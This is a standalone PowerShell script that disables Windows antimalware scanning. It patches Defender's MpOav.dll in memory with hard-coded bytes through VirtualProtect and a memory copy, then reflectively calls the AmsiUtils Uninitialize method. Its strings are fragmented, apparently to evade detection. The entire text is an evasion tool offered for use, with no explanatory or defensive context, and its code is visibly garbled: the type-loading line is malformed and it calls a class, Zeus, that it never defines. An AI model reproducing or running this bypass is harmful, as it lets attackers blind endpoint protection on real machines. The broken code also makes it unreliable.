$APIs = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
}
"@
A+'dd'-T+'y'+'p'+'e' $Zeus
$zzz1 = "0xB8"
$zzz2 = "0x57"
$zzz3 = "0x00"
$zzz4 = "0x07"
$zzz5 = "0x80"
$zzz6 = "0xC3"
$Patch = [Byte[]] ($zzz1,$zzz2,$zzz3,$zzz4,+$zzz5,+$zzz6)
$LoadLibrary = [Zeus]::LoadLibrary("MpOav.dll")
$Address = [Zeus]::GetProcAddress($LoadLibrary,"DllGetClassObject")
$p = 0
[Zeus]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::'C'+'o'+'p'+'y'($Patch, 0, $Address, 6)
$object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls')
$Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null)